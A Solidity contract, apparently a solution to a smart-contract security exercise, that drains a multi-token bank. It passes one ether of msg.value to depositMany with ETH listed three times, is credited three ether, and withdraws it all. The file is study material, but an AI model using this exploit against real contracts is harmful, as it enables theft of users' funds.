// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

interface IMultiTokenBank {
    function balances(address, address) external view returns (uint256);
    function depositMany(address[] calldata, uint256[] calldata)
        external
        payable;
    function deposit(address, uint256) external payable;
    function withdraw(address, uint256) external;
}

contract MultiTokenBankExploit {
    address public constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;
    address[] public tokens;
    uint256[] public amounts;
    
    IMultiTokenBank public bank;

    constructor(address _bank) {
        bank = IMultiTokenBank(_bank);
        for(uint256 i = 0; i < 3; i++) {
            tokens.push(ETH);
            amounts.push(1 ether);
        }
    }

    receive() external payable {}

    function pwn() external payable {
        // write your code here
        bank.depositMany{value: 1 ether}(tokens, amounts);
        bank.withdraw(ETH, 3 ether);
    }
}